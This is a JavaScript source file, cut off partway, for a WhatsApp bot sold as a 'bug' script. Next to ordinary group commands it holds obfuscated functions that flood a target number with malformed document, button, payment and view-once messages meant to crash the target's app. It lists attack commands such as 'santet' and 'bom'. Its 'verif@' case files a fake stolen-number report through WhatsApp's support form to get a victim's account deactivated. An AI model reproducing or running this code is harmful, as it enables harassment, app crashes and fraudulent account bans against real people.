require('../settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const util = require("util");
const cheerio = require("cheerio");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./lib/color')
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./lib/functions')
const { buttonvirus } = require('./lib/buttonvirus')
const { konf } = require('./lib/konf')
const { vnolim } = require('./lib/vnolim')

const addusrp = JSON.parse(fs.readFileSync('./nodeJS/database/user.json'))
const bugchat = JSON.parse(fs.readFileSync('./nodeJS/database/akses.json'))

module.exports = lexxy = async (lexxy, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await lexxy.decodeJid(lexxy.user.id)
const isDeveloper = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMeLexx = [botNumber, ...global.bugrup].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAkses = [botNumber, ...bugchat].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)

const { chats } = m

const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')

const isGroup = m.chat.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await lexxy.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isQuotedMsg = (type == 'extendedTextMessage')

if (!lexxy.public) {
if (!m.key.fromMe) return
}

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
	
try {
ppuser = await lexxy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = lexxy.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = lexxy.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

const mentionByTag = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

const createPassword = (size) => {
return crypto.randomBytes(size).toString('hex').slice(sender, size)
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const reply = (teks) => {
lexxy.sendMessage(m.chat, { text: teks }, { quoted: m })
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

let fakelex = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${runtime(process.uptime())}`, jpegThumbnail: ppnyauser}}}

const cpimage = async (caption) => {
lexxy.sendMessage(from,{text:caption},{quoted:fakelex})
}

// My Function Send/Ngirim Bug
// Bang Kok Di Enc? Ya Serah Gua

const sendviewOnce = async (target) => {
function _0x5869(_0x665b28,_0x2b0882){var _0x222ce3=_0x222c();return _0x5869=function(_0x5869dd,_0x2a475f){_0x5869dd=_0x5869dd-0xb4;var _0xd796b2=_0x222ce3[_0x5869dd];return _0xd796b2;},_0x5869(_0x665b28,_0x2b0882);}var _0x1b9d30=_0x5869;(function(_0x1fdb73,_0x3b81c3){var _0x2b49e4=_0x5869,_0x72a0f3=_0x1fdb73();while(!![]){try{var _0x411106=-parseInt(_0x2b49e4(0xb6))/0x1*(parseInt(_0x2b49e4(0xbb))/0x2)+parseInt(_0x2b49e4(0xbd))/0x3+-parseInt(_0x2b49e4(0xb4))/0x4*(parseInt(_0x2b49e4(0xb7))/0x5)+-parseInt(_0x2b49e4(0xbc))/0x6+-parseInt(_0x2b49e4(0xba))/0x7+parseInt(_0x2b49e4(0xb8))/0x8+-parseInt(_0x2b49e4(0xb5))/0x9*(-parseInt(_0x2b49e4(0xbe))/0xa);if(_0x411106===_0x3b81c3)break;else _0x72a0f3['push'](_0x72a0f3['shift']());}catch(_0x303be1){_0x72a0f3['push'](_0x72a0f3['shift']());}}}(_0x222c,0xa3f4d),lexxy[_0x1b9d30(0xb9)](target,{'image':{'url':'https://telegra.ph/file/6b22a2b9fe6577371a9b1.jpg'},'viewOnce':!![],'caption':'*I-LOVEYOU*'}));function _0x222c(){var _0x5dec1a=['8nugRwQ','3306480rgHVji','1250889aevEli','36715060pgwwJS','8MTHFWW','9sfvJDF','277316fRuvCX','1870795XdYidz','367768zxcyZx','sendMessage','7379491oUKgUH'];_0x222c=function(){return _0x5dec1a;};return _0x222c();}
}

const sendBugPay = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
var _0x2e715d=_0x3c82;function _0x30f5(){var _0x288deb=['1525674pJRrjN','fromObject','27oiFTQG','8650BwxgMR','1338KdgarU','259xVkelf','My\x20Developer\x20Bot','relayMessage','289940WBSCVJ','402276WkgNmu','3531140GNBCwL','IDR','key','Message','message','54512XuINjx','1246756azfJEY','100'];_0x30f5=function(){return _0x288deb;};return _0x30f5();}(function(_0x537bc6,_0x127fd8){var _0x5f48a1=_0x3c82,_0x1a526f=_0x537bc6();while(!![]){try{var _0x532f04=parseInt(_0x5f48a1(0x125))/0x1+parseInt(_0x5f48a1(0x11b))/0x2+parseInt(_0x5f48a1(0x11d))/0x3+parseInt(_0x5f48a1(0x126))/0x4+-parseInt(_0x5f48a1(0x120))/0x5*(parseInt(_0x5f48a1(0x121))/0x6)+parseInt(_0x5f48a1(0x122))/0x7*(parseInt(_0x5f48a1(0x11a))/0x8)+-parseInt(_0x5f48a1(0x11f))/0x9*(parseInt(_0x5f48a1(0x127))/0xa);if(_0x532f04===_0x127fd8)break;else _0x1a526f['push'](_0x1a526f['shift']());}catch(_0x3fc7ce){_0x1a526f['push'](_0x1a526f['shift']());}}}(_0x30f5,0x506d7));function _0x3c82(_0x477634,_0x557625){var _0x30f519=_0x30f5();return _0x3c82=function(_0x3c8201,_0x2a1f15){_0x3c8201=_0x3c8201-0x116;var _0x4579de=_0x30f519[_0x3c8201];return _0x4579de;},_0x3c82(_0x477634,_0x557625);}var requestPaymentMessage=generateWAMessageFromContent(from,proto[_0x2e715d(0x118)][_0x2e715d(0x11e)]({'requestPaymentMessage':{'currencyCodeIso4217':_0x2e715d(0x116),'amount1000':_0x2e715d(0x11c),'extendedTextMessage':{'text':_0x2e715d(0x123)}}}),{'userJid':from,'quoted':m});lexxy[_0x2e715d(0x124)](target,requestPaymentMessage[_0x2e715d(0x119)],{'messageId':requestPaymentMessage[_0x2e715d(0x117)]['id']});
}}

const sendDocu = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
var _0x35b755=_0x5b5e;function _0x30e2(){var _0x29826a=['8845047rEDDKt','8ACufjH','2694332KOsaKB','Message','/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20','.jpeg','9043188uVNrMr','303093VEjdZf','2507532lAmIkI','309314EcocgP','4MhBEXo','SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=','\x0a\x0a\x0a\x0a','5946080qHaasR','𝐋𝐞𝐱𝐱𝐲𝐓𝐳𝐲𝐇𝐞𝐧𝐠𝐤𝐞𝐫𝐏𝐫𝐨𝐅𝐅📄\x0a\x0a\x0a','1658703206','https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc','5VCyixt','47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=','relayMessage','CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY='];_0x30e2=function(){return _0x29826a;};return _0x30e2();}(function(_0xcf3f3f,_0x109a59){var _0x1df655=_0x5b5e,_0x25521a=_0xcf3f3f();while(!![]){try{var _0x3421d0=parseInt(_0x1df655(0x1d2))/0x1*(parseInt(_0x1df655(0x1d3))/0x2)+parseInt(_0x1df655(0x1d1))/0x3+-parseInt(_0x1df655(0x1e0))/0x4*(parseInt(_0x1df655(0x1da))/0x5)+-parseInt(_0x1df655(0x1cf))/0x6+parseInt(_0x1df655(0x1d0))/0x7+-parseInt(_0x1df655(0x1df))/0x8*(-parseInt(_0x1df655(0x1de))/0x9)+parseInt(_0x1df655(0x1d6))/0xa;if(_0x3421d0===_0x109a59)break;else _0x25521a['push'](_0x25521a['shift']());}catch(_0x1fa0c7){_0x25521a['push'](_0x25521a['shift']());}}}(_0x30e2,0xda5ad));function _0x5b5e(_0x21e490,_0x1f0af9){var _0x30e288=_0x30e2();return _0x5b5e=function(_0x5b5ebf,_0x576119){_0x5b5ebf=_0x5b5ebf-0x1cf;var _0x39386f=_0x30e288[_0x5b5ebf];return _0x39386f;},_0x5b5e(_0x21e490,_0x1f0af9);}var document=generateWAMessageFromContent(target,proto[_0x35b755(0x1e1)]['fromObject']({'documentMessage':{'url':_0x35b755(0x1d9),'mimetype':'','title':'𝗕𝗔𝗦𝗘\x20𝗦𝗜𝗗','fileSha256':_0x35b755(0x1db),'pageCount':0xf4240,'mediaKey':_0x35b755(0x1d4),'fileName':_0x35b755(0x1d7)+konf+_0x35b755(0x1d5)+vnolim+_0x35b755(0x1e3),'fileEncSha256':_0x35b755(0x1dd),'directPath':_0x35b755(0x1e2),'mediaKeyTimestamp':_0x35b755(0x1d8)}}),{'userJid':target});lexxy[_0x35b755(0x1dc)](target,document['message'],{'messageId':document['key']['id']});
}}

// button 6
const sendBug = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
function _0x25a9(_0x1cc8b8,_0x5aac84){var _0x352cce=_0x352c();return _0x25a9=function(_0x25a9fd,_0x4c1b7b){_0x25a9fd=_0x25a9fd-0x181;var _0x281b4f=_0x352cce[_0x25a9fd];return _0x281b4f;},_0x25a9(_0x1cc8b8,_0x5aac84);}function _0x352c(){var _0x3c9256=['228ZxWzkJ','21848gjWzqY','sendMessage','3996657yRrEmi','77036FHgyrY','112kmrzIf','16404LvLWEx','4116850hvVFsB','6jUuijK','42ixHQBP','https://www.whatsapp.com/otp/copy/','89930dsrhJN','7689exDDES','3896RRNCFL','https://wa.me/'];_0x352c=function(){return _0x3c9256;};return _0x352c();}var _0x480848=_0x25a9;(function(_0x101554,_0xda888){var _0x7489ed=_0x25a9,_0x8caef9=_0x101554();while(!![]){try{var _0x3725c3=parseInt(_0x7489ed(0x187))/0x1*(parseInt(_0x7489ed(0x183))/0x2)+-parseInt(_0x7489ed(0x18e))/0x3*(parseInt(_0x7489ed(0x18c))/0x4)+-parseInt(_0x7489ed(0x18a))/0x5*(-parseInt(_0x7489ed(0x188))/0x6)+-parseInt(_0x7489ed(0x184))/0x7*(-parseInt(_0x7489ed(0x18f))/0x8)+parseInt(_0x7489ed(0x182))/0x9+parseInt(_0x7489ed(0x186))/0xa+-parseInt(_0x7489ed(0x18b))/0xb*(parseInt(_0x7489ed(0x185))/0xc);if(_0x3725c3===_0xda888)break;else _0x8caef9['push'](_0x8caef9['shift']());}catch(_0x340ffe){_0x8caef9['push'](_0x8caef9['shift']());}}}(_0x352c,0x3765b),lexxy[_0x480848(0x181)](target,{'text':'','templateButtons':[{'callButton':{'displayText':'Hi','phoneNumber':''}},{'urlButton':{'displayText':'Hi','url':_0x480848(0x18d)}},{'urlButton':{'displayText':'Hi','url':_0x480848(0x189)}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}}]}));
}}

// buttons 9
const sendBug2 = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
function _0x568a(_0x1c3932,_0x4b467a){var _0x3376d5=_0x3376();return _0x568a=function(_0x568ad1,_0x28c36f){_0x568ad1=_0x568ad1-0xe5;var _0xec5b0f=_0x3376d5[_0x568ad1];return _0xec5b0f;},_0x568a(_0x1c3932,_0x4b467a);}function _0x3376(){var _0x20ec8f=['1355613mhPOfS','10LsOhsx','9CQXOOY','671215ZmLtAS','624126qwoJUE','4fzeFeM','14880890OlFEyJ','9453880jXMrTv','628002KzocTG','1272255ocFWLQ'];_0x3376=function(){return _0x20ec8f;};return _0x3376();}(function(_0x17de0e,_0x7cd796){var _0x38a030=_0x568a,_0x39739e=_0x17de0e();while(!![]){try{var _0x1db320=-parseInt(_0x38a030(0xe9))/0x1+parseInt(_0x38a030(0xe7))/0x2*(parseInt(_0x38a030(0xee))/0x3)+parseInt(_0x38a030(0xeb))/0x4*(parseInt(_0x38a030(0xe5))/0x5)+parseInt(_0x38a030(0xea))/0x6+parseInt(_0x38a030(0xe6))/0x7+parseInt(_0x38a030(0xed))/0x8*(parseInt(_0x38a030(0xe8))/0x9)+-parseInt(_0x38a030(0xec))/0xa;if(_0x1db320===_0x7cd796)break;else _0x39739e['push'](_0x39739e['shift']());}catch(_0x3bc3ea){_0x39739e['push'](_0x39739e['shift']());}}}(_0x3376,0x97ab0),lexxy['sendMessage'](target,{'text':'','templateButtons':[{'callButton':{'displayText':'Hi','phoneNumber':''}},{'callButton':{'displayText':'Hi','phoneNumber':''}},{'urlButton':{'displayText':'Hi','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}},{'quickReplyButton':{'displayText':'Hi','id':''}}]}));
}}

if (command) {
lexxy.readMessages([m.key])
}

const textbugmenu =`
𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 𝗕𝗨𝗚

 𝘽𝙐𝙂 𝙀𝙈𝙊𝙅𝙄
 ▢ 🍅 628𝙭𝙭𝙭𝙭𝙭𝙭
 ▢ 🌹 628𝙭𝙭𝙭𝙭𝙭𝙭
 ▢ ☕ 628𝙭𝙭𝙭𝙭𝙭𝙭
 ▢ ☠️ 628𝙭𝙭𝙭𝙭𝙭𝙭
 ▢ 🌷 628𝙭𝙭𝙭𝙭𝙭𝙭
 ▢ 🔥 628𝙭𝙭𝙭𝙭𝙭𝙭

 𝘽𝙐𝙂 𝘼𝙏𝙏𝘼𝘾𝙆
 ▢ bugchat 628𝙭𝙭𝙭𝙭𝙭
 ▢ santetpc 628𝙭𝙭𝙭𝙭𝙭
 ▢ bugpc 628𝙭𝙭𝙭𝙭
 ▢ bom 628𝙭𝙭𝙭𝙭
 ▢ turu 628𝙭𝙭𝙭𝙭
 ▢ hard 628𝙭𝙭𝙭𝙭
 ▢ ganas 628𝙭𝙭𝙭𝙭
 ▢ trava 628𝙭𝙭𝙭𝙭
 ▢ troli 628𝙭𝙭𝙭𝙭
 ▢ dark 628𝙭𝙭𝙭𝙭
 ▢ santet 628𝙭𝙭𝙭𝙭
 ▢ lexgas 628𝙭𝙭𝙭𝙭,20

 𝘽𝙐𝙂 𝙄𝙉𝙑𝙄𝙏𝙀 ( 𝙂𝙍𝙐𝙋 )
 ▢ bomgc linkgrup
 ▢ trolgc linkgrup
 ▢ buggc linkgrup
 ▢ santetgc linkgrup

 𝙊𝙒𝙉𝙀𝙍 𝘼𝙆𝙎𝙀𝙎
 ▢ delakses 628𝙭𝙭𝙭𝙭𝙭
 ▢ addakses 628𝙭𝙭𝙭𝙭𝙭

 𝘽𝙐𝙂 𝙑𝙀𝙍𝙄𝙁𝙔
 ▢ out@ 628𝙭𝙭𝙭𝙭𝙭
 ▢ verif@ 628𝙭𝙭𝙭𝙭𝙭
 ▢ kenon@ 628𝙭𝙭𝙭𝙭𝙭
 ▢ resetotp@ 628𝙭𝙭𝙭𝙭𝙭
 ▢ banned@ 628𝙭𝙭𝙭𝙭𝙭
 ▢ unbanwa@ 628𝙭𝙭𝙭𝙭𝙭

𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 𝗚𝗥𝗢𝗨𝗣
 ▢ linkgrup
 ▢ revoke
 ▢ hidetag
 ▢ kick @tag
 ▢ grup on/off
 ▢ demote @tag
 ▢ promote @tag
`

switch (command) {
case 'linkgrup': case 'linkgc':{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
var url = await lexxy.groupInviteCode(from).catch(() => reply('Maaf terjadi kesalahan'))
url = 'https://chat.whatsapp.com/'+url
reply(url)
}
break
case 'revoke':{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
await lexxy.groupRevokeInvite(from)
.then(res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply('Maaf terjadi kesalahan'))
}
break
case 'group': case 'grup':
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
if (args[0] == "off") {
lexxy.groupSettingUpdate(from, 'announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] == "on") {
lexxy.groupSettingUpdate(from, 'not_announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else {
reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : ${prefix+command} on`)
}
break
case "hidetag":{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
let mem = [];
groupMembers.map( i => mem.push(i.id) )
lexxy.sendMessage(from, { text: q ? q : '', mentions: mem })
}
break
case "kick": {
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isBotAdmins) return reply('Jadiin bot admin dong biar bisa')
if (!isGroupAdmins) return reply('Fitur ini khusus admin grup')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lexxy.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'promote':
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
if (mentionUser.length !== 0) {
lexxy.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply('Maaf terjadi kesalahan'))
} else if (isQuotedMsg) {
lexxy.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply('Maaf terjadi kesalahan'))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix+command} @tag`)
}
break
case 'demote':
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return reply('Bot Harus menjadi admin')
if (mentionUser.length !== 0) {
lexxy.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply('Maaf terjadi kesalahan'))
} else if (isQuotedMsg) {
lexxy.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply('Maaf terjadi kesalahan'))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break

// LIST MENU
case "menu":{
cpimage(textbugmenu)
}
break
case "buysc":{
let lexxy = '6288219947210@s.whatsapp.net'
mentions(`MAU BUY SCRIPT BOT?
CHAT @${lexxy.split('@')[0]}`,[YT: Neo403])
}
break
case "lexgas": {
if (!isDeveloper) return reply('fitur ini khusus owner bot')
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1]
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (!jumlah) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let jumlahnya = `${encodeURI(jumlah)}`
var cekap = await lexxy.onWhatsApp(targetnya + '@s.whatsapp.net')
let target = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '6285789004732@s.whatsapp.net') return
if (target == '6283834558105@s.whatsapp.net') return
reply('*Proses⌛*')
sendDocu(target,jumlahnya)
await sleep(2000)
sendviewOnce(target)
lexxy.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
await sleep(2000)
}
break

// BUG VERIFY
case "out@":
case "verif@":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!isDeveloper)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await lexxy['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6288219947210','54mgTCKv','6285789004732','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Para WhatsApp\nDesative minha conta, pois meu número e documentação foram roubados e não consigo acessar novamente`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case "unbanwa@":{
